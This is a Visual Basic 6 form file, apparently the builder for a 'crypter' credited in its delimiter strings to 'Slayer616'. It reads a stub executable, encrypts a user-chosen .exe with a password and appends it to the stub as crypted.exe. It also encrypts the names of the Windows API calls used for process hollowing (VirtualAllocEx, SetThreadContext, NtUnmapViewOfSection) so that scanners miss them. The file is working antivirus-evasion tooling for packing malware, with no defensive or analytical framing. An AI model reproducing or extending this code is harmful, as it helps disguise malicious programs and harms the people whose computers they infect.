VERSION 5.00
Object = "{F9043C88-F6F2-101A-A3C9-08002B2F49FB}#1.2#0"; "COMDLG32.OCX"
Begin VB.Form Form1 
   Caption         =   "Form1"
   ClientHeight    =   1380
   ClientLeft      =   60
   ClientTop       =   450
   ClientWidth     =   2730
   LinkTopic       =   "Form1"
   ScaleHeight     =   1380
   ScaleWidth      =   2730
   StartUpPosition =   3  'Windows-Standard
   Begin VB.CommandButton Command2 
      Caption         =   "..."
      Height          =   375
      Left            =   1920
      TabIndex        =   3
      Top             =   120
      Width           =   735
   End
   Begin VB.CommandButton Command1 
      Caption         =   "Build"
      Height          =   375
      Left            =   120
      TabIndex        =   2
      Top             =   840
      Width           =   1695
   End
   Begin MSComDlg.CommonDialog cd 
      Left            =   1920
      Top             =   240
      _ExtentX        =   847
      _ExtentY        =   847
      _Version        =   393216
   End
   Begin VB.TextBox Text2 
      Height          =   285
      Left            =   120
      TabIndex        =   1
      Top             =   120
      Width           =   1695
   End
   Begin VB.TextBox Text1 
      Height          =   285
      Left            =   120
      TabIndex        =   0
      Text            =   "Password"
      Top             =   480
      Width           =   1695
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Private Sub Command1_Click()
Dim Data As String
Dim StubData As String
Open App.Path & "\stub.exe" For Binary As #1
StubData = Space(LOF(1))
Get #1, , StubData
Close #1
Open Text2.Text For Binary As #1
Data = Space(LOF(1))
Get #1, , Data
Close #1
Open App.Path & "\crypted.exe" For Binary As #1
Data = StubData & "Slayer616sSource" & Str2Hex(strEncrypt(Data, Text1.Text)) & "Slayer616sSource" & Text1.Text & "Slayer616sSource" & CryptedApis & "Slayer616sSource"
Put #1, , Data
Close #1
MsgBox "built"
End Sub

Private Sub Command2_Click()
cd.Filter = "PE|*.exe"
cd.ShowOpen
If cd.FileName <> "" Then
Text2.Text = cd.FileName
End If
End Sub


Function CryptedApis() As String
CryptedApis = Str2Hex(strEncrypt("ntdll", Text1.Text)) & "///" & Str2Hex(strEncrypt("kernel32", Text1.Text)) & "///" & Str2Hex(strEncrypt("VirtualAllocEx", Text1.Text)) & "///" & Str2Hex(strEncrypt("GetThreadContext", Text1.Text)) & "///" & Str2Hex(strEncrypt("SetThreadContext", Text1.Text)) & "///" & Str2Hex(strEncrypt("ResumeThread", Text1.Text)) & "///" & Str2Hex(strEncrypt("NtUnmapViewOfSection", Text1.Text))
End Function
